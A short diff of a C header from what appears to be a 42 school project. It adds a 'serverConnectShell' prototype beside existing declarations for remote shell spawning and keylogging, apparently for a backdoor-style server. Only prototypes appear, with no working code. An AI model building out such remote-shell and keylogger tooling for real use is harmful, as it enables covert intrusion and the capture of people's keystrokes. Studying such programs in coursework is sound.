@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2019/08/04 01:30:53 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/08/05 00:04:15 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -98,6 +98,7 @@ int				spawnShell();
 void			serverReadClientShell(t_cl *client);
 void			serverQuitClientShell(t_cl *client, t_cmd *cmds);
 void			serverRemoteShell(t_cl *client, t_cmd *cmds);
+int				serverConnectShell(t_cl *client, char *port);
 void			serverKeylogger(t_cl *client, t_cmd *cmds);
 int				serverInitKeylogger(int socket);
 void			serverPrintLogs(t_cl *client, t_cmd *cmds);
